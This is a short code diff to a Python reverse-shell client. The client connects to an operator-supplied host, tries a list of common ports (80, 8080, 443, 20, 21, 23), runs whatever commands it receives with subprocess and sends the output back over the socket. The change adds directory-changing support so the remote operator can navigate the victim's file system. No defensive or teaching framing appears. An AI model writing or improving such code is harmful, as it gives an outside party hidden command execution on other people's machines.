@@ -2,6 +2,7 @@ import socket
 import subprocess
 import sys
 import time
+import os
 
 HOST = sys.argv[1]
 ports = [80, 8080, 443, 20, 21, 23]
@@ -38,7 +39,14 @@ while True:
 			PORT = nextPort(PORT)
 			time.sleep(1)
 		else:
-			rsp = subprocess.getoutput(cmd)
+			if "cd" in cmd:
+				try:
+					os.chdir(cmd[3::])
+					rsp = subprocess.getoutput(cmd)
+				except:
+					rsp = "No such directory"
+			else:
+				rsp = subprocess.getoutput(cmd)
 			s.send(rsp.encode())
 	except Exception as e:
 		open_conn = False
